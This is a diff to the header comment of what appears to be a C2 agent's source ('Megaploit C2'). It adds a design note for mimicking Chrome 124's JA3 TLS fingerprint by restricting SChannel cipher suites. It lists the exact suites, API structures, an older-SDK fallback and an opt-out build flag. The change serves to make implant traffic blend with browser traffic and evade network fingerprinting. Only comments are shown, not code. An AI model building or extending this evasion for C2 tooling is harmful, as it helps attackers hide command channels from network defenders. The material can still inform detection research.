@@ -3,15 +3,46 @@
  * =======================================================================
  * Matches the Megaploit C2 security standards exactly:
  *
- *  TLS hardening
- *  -------------
+ *  TLS hardening  (browser-matching JA3 fingerprint)
+ *  --------------------------------------------------
  *  • SChannel (Windows native) with SP_PROT_TLS1_2 | SP_PROT_TLS1_3
  *  • AEAD-only cipher suites via SCH_USE_STRONG_CRYPTO flag
  *    (maps to AES-128/256-GCM, ChaCha20-Poly1305 on Win10+)
  *  • SSL 2/3 and TLS 1.0/1.1 explicitly disabled
  *  • No renegotiation (ISC_REQ_NO_RENEGOTIATION where available)
- *  • No null/anonymous/export/RC4 ciphers
+ *  • No null/anonymous/export/RC4/3DES/DES/MD5 ciphers
  *  • Forward secrecy: ISC_REQ_EXTENDED_ERROR | ISC_REQ_MANUAL_CRED_VALIDATION
+ *
+ *  JA3 browser fingerprint matching (Win10 SDK ≥ 17763 / mingw-w64 UCRT64)
+ *  -------------------------------------------------------------------------
+ *  • Uses SCH_CREDENTIALS + TLS_PARAMETERS + CRYPTO_SETTINGS (pDisabledCrypto)
+ *    instead of the legacy SCHANNEL_CRED to restrict the cipher suite set to
+ *    exactly what Chrome 124 advertises in its ClientHello:
+ *
+ *      TLS 1.3  (automatic in SChannel):
+ *        0x1301  TLS_AES_128_GCM_SHA256
+ *        0x1302  TLS_AES_256_GCM_SHA384
+ *        0x1303  TLS_CHACHA20_POLY1305_SHA256
+ *
+ *      TLS 1.2:
+ *        0xC02B  TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
+ *        0xC02F  TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+ *        0xC02C  TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384
+ *        0xC030  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+ *        0xCCA9  TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256
+ *        0xCCA8  TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256
+ *        0xC013  TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
+ *        0xC014  TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
+ *        0x009C  TLS_RSA_WITH_AES_128_GCM_SHA256
+ *        0x009D  TLS_RSA_WITH_AES_256_GCM_SHA384
+ *        0x002F  TLS_RSA_WITH_AES_128_CBC_SHA
+ *        0x0035  TLS_RSA_WITH_AES_256_CBC_SHA
+ *
+ *  • Disabled components: RC4, 3DES, DES, NULL-cipher, MD5 (as MAC),
+ *    anonymous ECDH, anonymous DH.
+ *  • Falls back to SCH_USE_STRONG_CRYPTO / SCHANNEL_CRED on older SDKs or
+ *    when the runtime rejects SCH_CREDENTIALS.
+ *  • Opt out at build time: -DNO_JA3_PROFILE  (or  NO_JA3_PROFILE=1 in make)
  *
  *  Post-TLS auth  (mirrors megaploit.core.crypto.agent_authenticate)
  *  ------------------------------------------------------------------
